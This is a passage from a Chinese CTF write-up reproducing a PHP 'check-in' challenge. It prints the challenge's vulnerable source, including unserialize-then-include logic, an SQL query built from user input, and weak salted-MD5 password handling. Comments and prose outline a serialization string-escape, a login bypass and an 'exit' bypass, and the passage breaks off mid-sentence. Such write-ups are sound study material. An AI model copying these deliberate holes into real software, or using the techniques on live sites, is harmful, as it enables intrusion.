class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">// index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">    session_start();</span></span><br><span class="line"><span class="meta">    if($_SESSION[&#x27;login&#x27;]!=1)&#123;</span></span><br><span class="line"><span class="meta">        echo &quot;&lt;script&gt;alert(\&quot;Please login!\&quot;);window.location.href=\&quot;./login.php\&quot;;&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="meta">        return ;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>打卡系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;HTML5 Template&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Forum - Responsive HTML5 Template&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Forum&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;favicon/favicon.ico&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;format-detection&quot;</span> <span class="attr">content</span>=<span class="string">&quot;telephone=no&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- tt-mobile menu --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;panel-menu&quot;</span> <span class="attr">id</span>=<span class="string">&quot;mobile-menu&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mm-navbtn-names&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mm-closebtn&quot;</span>&gt;</span></span><br><span class="line">            Close</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tt-icon&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">&quot;#icon-cancel&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">use</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mm-backbtn&quot;</span>&gt;</span>Back<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">main</span> <span class="attr">id</span>=<span class="string">&quot;tt-pageContent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tt-wrapper-inner&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;tt-title-border&quot;</span>&gt;</span></span><br><span class="line">                补卡系统</span><br><span class="line">            <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-default form-create-topic&quot;</span> <span class="attr">action</span>=<span class="string">&quot;./index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;inputTopicTitle&quot;</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tt-value-wrapper&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inputTopicTitle&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;&lt;?php echo $_SESSION[&#x27;username&#x27;];?&gt;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pt-editor&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h6</span> <span class="attr">class</span>=<span class="string">&quot;pt-title&quot;</span>&gt;</span>补卡原因<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;reason&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;5&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Lets get started&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-auto ml-md-auto&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-secondary btn-width-lg&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">include &#x27;./cache.php&#x27;;</span></span><br><span class="line"><span class="meta">$check=new checkin();</span></span><br><span class="line"><span class="meta">if(isset($_POST[&#x27;reason&#x27;]))&#123;</span></span><br><span class="line"><span class="meta">    if(isset($_GET[&#x27;debug_buka&#x27;]))</span></span><br><span class="line"><span class="meta">    &#123;</span></span><br><span class="line"><span class="meta">        $time=date($_GET[&#x27;debug_buka&#x27;]);</span></span><br><span class="line"><span class="meta">    &#125;else&#123;</span></span><br><span class="line"><span class="meta">        $time=date(&quot;Y-m-d H:i:s&quot;);</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">    $arraya=serialize(array(&quot;name&quot;=&gt;$_SESSION[&#x27;username&#x27;],&quot;reason&quot;=&gt;$_POST[&#x27;reason&#x27;],&quot;time&quot;=&gt;$time,&quot;background&quot;=&gt;&quot;ok&quot;));</span></span><br><span class="line"><span class="meta">    // 前文件名，后serialized的数组, reason可控，字符串逃逸重写background</span></span><br><span class="line"><span class="meta">    $check-&gt;writec($_SESSION[&#x27;username&#x27;].&#x27;-&#x27;.date(&quot;Y-m-d&quot;),$arraya);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">if(isset($_GET[&#x27;check&#x27;]))&#123;</span></span><br><span class="line"><span class="meta">    $cachefile = &#x27;/var/www/html/cache/&#x27; . $_SESSION[&#x27;username&#x27;].&#x27;-&#x27;.date(&quot;Y-m-d&quot;). &#x27;.php&#x27;;</span></span><br><span class="line"><span class="meta">    // $SESSION[&#x27;username&#x27;]是md5的，不可控，但是可以知道文件名</span></span><br><span class="line"><span class="meta">    if (is_file($cachefile)) &#123;</span></span><br><span class="line"><span class="meta">        $data=file_get_contents($cachefile);</span></span><br><span class="line"><span class="meta">        $checkdata = unserialize(str_replace(&quot;&lt;?php exit;//&quot;, &#x27;&#x27;, $data));</span></span><br><span class="line"><span class="meta">        $check=&quot;/var/www/html/&quot;.$checkdata[&#x27;background&#x27;].&quot;.php&quot;;</span></span><br><span class="line"><span class="meta">        include &quot;$check&quot;;</span></span><br><span class="line"><span class="meta">    &#125;else&#123;</span></span><br><span class="line"><span class="meta">        include &#x27;error.php&#x27;;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="打卡-ok-复现"><a href="#打卡-ok-复现" class="headerlink" title="打卡_ok | 复现"></a>打卡_ok | 复现</h3><ol><li><p>这里要绕过登录可能的路径有爆破、注入、找泄露这些(多个扫+逻辑判断)，这里时login.php<del>类似index.php</del>的泄露</p><ol><li>666，wp叫做<strong>扫出一个adminer_481.php</strong>，爆破字典555</li><li>误会wp了，可以在index.php<del>看到有backgroud等于ok后进行拼接，有ok.php，访问&#96;ok.php</del>&#96;可以得到adminer_481.php</li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;HTML5 Template&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;Forum - Responsive HTML5 Template&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;author&quot;</span> content=<span class="string">&quot;Forum&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;shortcut icon&quot;</span> href=<span class="string">&quot;favicon/favicon.ico&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;format-detection&quot;</span> content=<span class="string">&quot;telephone=no&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- tt-mobile menu --&gt;</span><br><span class="line"></span><br><span class="line">&lt;main id=<span class="string">&quot;tt-pageContent&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">tt</span>-<span class="title">offset</span>-<span class="title">none</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">tt</span>-<span class="title">loginpages</span>-<span class="title">wrapper</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">tt</span>-<span class="title">loginpages</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">html</span>&quot; <span class="title">class</span>=&quot;<span class="title">tt</span>-<span class="title">block</span>-<span class="title">title</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">tt</span>-<span class="title">title</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        登陆</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">default</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;./<span class="title">login</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">loginUserName</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">loginUserName</span>&quot; &gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">loginUserPassword</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">loginUserPassword</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">code</span>&quot;&gt;<span class="title">code</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">code</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span>  <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">secondary</span> <span class="title">btn</span>-<span class="title">block</span>&quot;&gt;<span class="title">Log</span> <span class="title">in</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">bundle</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">$<span class="title">servername</span> = &quot;<span class="title">localhost</span>&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">username</span> = &quot;<span class="title">web</span>&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">password</span> = &quot;<span class="title">web</span>&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">dbname</span> = &quot;<span class="title">web</span>&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">conn</span> = <span class="title">new</span> <span class="title">mysqli</span>($<span class="title">servername</span>, $<span class="title">username</span>, $<span class="title">password</span>, $<span class="title">dbname</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> ($<span class="title">conn</span>-&gt;<span class="title">connect_error</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;./pass.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$endpass</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$code</span>.<span class="variable">$password</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$code</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select password from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">// 存在用户</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$endpass</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="variable">$username</span>); <span class="comment">// username不可控啊</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;Welcome <span class="subst">$username</span>!\&quot;);window.location.href=\&quot;./index.php\&quot;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;错误\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mypass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">        <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 总是进行随机生成，长度为10，这个是什么密码啊</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkpass</span>(<span class="params"><span class="variable">$plain</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">        <span class="variable">$salt</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>), <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span> . <span class="variable">$plain</span>) . <span class="string">&#x27;:&#x27;</span> . <span class="variable">$salt</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>这里还要死亡绕过，include后的本身有<code>&lt;?php 